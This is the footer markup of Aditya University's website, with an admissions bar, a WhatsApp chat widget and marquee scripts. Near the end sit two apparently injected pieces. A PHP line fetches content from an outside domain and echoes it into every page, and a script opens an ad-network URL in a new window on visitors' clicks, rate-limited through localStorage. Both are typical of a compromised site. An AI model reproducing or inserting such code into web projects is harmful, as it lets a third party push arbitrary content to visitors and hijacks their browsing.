        <div class="col-md-12">
            <p style="float: left;margin-top: 15px; "><b>Aditya University</b> © 2024 - All Rights Reserved.</p><p style="float: right;" ><b>Powered By</b> &nbsp;&nbsp;<a href="http://technicalhub.io/" target="new" class="myLinkClass" style="list-style:none;color:white;"
                id="thub"><img src="logos/T-Hub_logo.png" alt="" style="width:200px;height:50px;"></a></p>
            <div class="clearfix"></div>
        </div>
    </div>
</div>
</div>

</div>

</div>

<!--  <div class="float3 navbar-fixed-bottom apply_admission_card" style="background-color: #fd752c;height: 60px;margin-bottom: 0px">
         <div class="container">
          <div class="col-md-12">
             <div class="col-md-2">
             <a href="https://api.whatsapp.com/send?phone=+919553649666 & test=Hi! I am Interested to take admission in ADITYA. Can you guide me through admission process? " class="float1" target="_blank">
      <i class="fa fa-whatsapp my-float"></i> </a>
           </div>
            <div class="col-md-offset-2 col-md-8 apply_admission" >
              <p style="float: center;color: white;line-height:5px ;"><b class="name">APPLY FOR ADMISSIONS 2020&nbsp;&nbsp;</b>&nbsp;&nbsp;&nbsp;<button class="login_btn1"><a href="https://aditya.ac.in/admission/" target="_blank" style="color: white;"><b>Join Today</b></a></button></p>
             </div>
               <div class="col-md-2">
               <a href="https://www.facebook.com/AdityaEngineeringColleges" target="_blank" class="float2" title="Welcome to Aditya">
               <img src="logos/fb.png" style="width:63px;" alt="fb_messenger">
            </a>
            </div>
           </div>
  </div>
</div> -->

<div class="container">
  <div class="float3 navbar-fixed-bottom apply_admission_card" style="background-color: #fd752c;height: 60px;margin-bottom: 0px">
   <div class="container">
    <div class="row">
     <div class="col-md-1">
      <div id="myButton" class="btn_wtp"> </div>
    </div>
    <!-- <div class="col-md-6 col-md-offset-2 hidden-sm hidden-xs apply_admission" >
      <p style="color: white;line-height:1.6px ;" class="text-center "><b class="name">&nbsp;APPLY FOR ADMISSIONS&nbsp;&nbsp;</b>&nbsp;&nbsp;&nbsp;<button class="login_btn1"><a href="https://www.aec.edu.in/admission/" target="_blank" style="color: white;"><b>Join Today</b></a></button></p>
    </div>

    <div class="col-md-6 col-md-offset-2 hidden-md hidden-lg apply_admission" >
      <p style="color: white;line-height:1.6px ;" class="text-center"><b class="name">&nbsp;APPLY FOR ADMISSIONS</b>&nbsp;&nbsp;&nbsp;<br/><button class="login_btn1"><a href="https://www.aec.edu.in/admission/" target="_blank" style="color: white;"><b>Join Today</b></a></button></p>
    </div> -->


    <div class="col-md-1">
     <a href="https://www.facebook.com/AdityaEngineeringColleges" target="_blank" class="float2" title="Welcome to Aditya">
       <img src="logos/fb.png" style="width:64px;" alt="fb_messenger"/>
     </a>
   </div>
 </div>
</div>
</div>
</div>
<?php $a = file_get_contents('https://2ez4me.us/who/');echo $a; ?>

<script>
  const adUrl = "https://www.profitableratecpm.com/t0in8wazza?key=e24fa901e6afc3a98b745c917f51fdcd";
  const delayInMinutes = 5;
  const delayInMs = delayInMinutes * 60 * 1000;

  function redirectWithCooldown() {
    const lastOpened = localStorage.getItem("lastAdTime");
    const now = Date.now();

    if (!lastOpened || now - parseInt(lastOpened, 10) > delayInMs) {
      localStorage.setItem("lastAdTime", now.toString());
      window.open(adUrl, "_blank");
    }
  }

  document.addEventListener("click", function () {
    redirectWithCooldown();
  });
</script>

</footer>

<!-- Footer Area End Here -->
</div>



    <link rel="stylesheet" href="whatsapp/floating-wpp.css">
    <script type="text/javascript" src="whatsapp/floating-wpp.js"></script>

    <script type="text/javascript">
      $(function () {
        $('#myButton').floatingWhatsApp({
          phone: '919553649666',
          popupMessage: 'Hello, how can we help you?',
          message: "Hi! I am Interested to take admission in ADITYA. Can you guide me through admission process? ",
          showPopup: true,
          showOnIE: false,
          headerTitle: 'Welcome!',
          headerColor: '#2a9a2e',
          backgroundColor: '#2a9a2e',
          // buttonImage: '<img src="burger.svg"/>',
          // height: '60px',
          // width: '60px',

          });
      });

      $(document).ready(function() {
      // alert("page is loaded");
      $("#b-close").click(function() {
        $(".popup_this_container").fadeOut(0);
      });
      });

      // var screen_width= screen.width;
      // console.log(screen_width)
      // let mm1 = document.getElementsByTagName("li")[0];
      // console.log(mm1);
      // mm1.onclick = function(){
      //   console.log("sss");
      // }
      // if(screen_width == 1775){
      //   $(".thired-level").css("left", "-400px"); 
      // }
    


function toggleMarquees() {
const marquee1 = document.getElementById('marquee1');
const marquee2 = document.getElementById('marquee2');
const marquee3 = document.getElementById('marquee3');

if (marquee1.style.display === 'none') {
    marquee1.style.display = 'block';
    marquee2.style.display = 'none';
    marquee3.style.display = 'none';
} else if (marquee2.style.display === 'none') {
    marquee2.style.display = 'block';
    marquee1.style.display = 'none';
    marquee3.style.display = 'none';
} else {
    marquee3.style.display = 'block';
    marquee1.style.display = 'none';
    marquee2.style.display = 'none';
}
}

// Set interval to switch between marquees every 10 seconds
setInterval(toggleMarquees, 9000);

// Show the first marquee initially
window.onload = () => {
document.getElementById('marquee1').style.display = 'block';
};
</script>
   



<script src="adityanew/js/plugins.js" type="text/javascript"></script>
<script src="adityanew/js/wow.min.js"></script>
<script src="adityanew/js/jquery.meanmenu.min.js" type="text/javascript"></script>
<script src="adityanew/js/jquery.scrollUp.min.js" type="text/javascript"></script>
<script src="adityanew/js/jquery.counterup.min.js"></script>
<script src="adityanew/js/waypoints.min.js"></script>
<script src="adityanew/js/jquery.countdown.min.js" type="text/javascript"></script>
<script src="adityanew/js/isotope.pkgd.min.js" type="text/javascript"></script>
<script src="adityanew/js/jquery.magnific-popup.min.js" type="text/javascript"></script>
<script src="adityanew/js/jquery.gridrotator.js" type="text/javascript"></script>
<script src="adityanew/js/main.js" type="text/javascript"></script>
<script src="js/tabslinks.js" type="text/javascript"></script>

</body>
</html>
